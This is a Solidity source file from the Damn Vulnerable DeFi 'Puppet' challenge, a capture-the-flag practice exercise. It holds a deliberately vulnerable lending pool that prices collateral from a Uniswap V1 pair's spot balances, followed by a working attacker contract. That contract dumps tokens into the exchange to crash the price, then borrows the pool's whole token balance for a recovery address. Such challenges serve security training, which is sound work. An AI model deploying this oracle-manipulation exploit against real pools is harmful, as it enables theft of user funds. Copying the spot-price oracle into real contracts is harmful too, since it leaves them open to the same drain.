// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";

contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address => uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value < depositRequired) {
            revert NotEnoughCollateral();
        }

        if (msg.value > depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] += depositRequired;
        }

        // Fails if the pool doesn't have enough tokens in liquidity
        if (!token.transfer(recipient, amount)) {
            revert TransferFailed();
        }

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return (amount * _computeOraclePrice() * DEPOSIT_FACTOR) / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return (uniswapPair.balance * (10 ** 18)) / token.balanceOf(uniswapPair);
    }
}
contract PuppetAttacker {
    PuppetPool public immutable pool;
    IUniswapV1Exchange public immutable exchange;
    DamnValuableToken public immutable token;
    address public immutable recovery;
    uint256 public constant DEPOSIT_FACTOR = 2;
    event Borrowed(uint256 amountRequired, uint256 deposit);

    constructor(PuppetPool _pool, IUniswapV1Exchange _exchange, address _recovery) {
        pool = _pool;
        exchange = _exchange;
        token = pool.token();
        recovery = _recovery;
    }
    receive() external payable {}

    function attackWithPermit(
        address owner,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external payable {
        token.permit(owner, address(this), value, deadline, v, r, s);
        token.transferFrom(owner, address(this), value);
        attack();
    }
    function attack() public payable {
        uint256 tokens_sold = token.balanceOf(address(this));
        token.approve(address(exchange), tokens_sold);
        uint256 min_eth = exchange.getEthToTokenInputPrice(tokens_sold);
        exchange.tokenToEthSwapInput(tokens_sold, min_eth, block.timestamp);
        uint256 deposit = address(this).balance;
        uint256 amount = token.balanceOf(address(pool));
        emit Borrowed(amount, deposit);
        pool.borrow{value: deposit}(amount, recovery);
    }
}
//uint256 amountRequired = (deposit * token.balanceOf(address(exchange))) /
//           DEPOSIT_FACTOR /
//           address(exchange).balance;
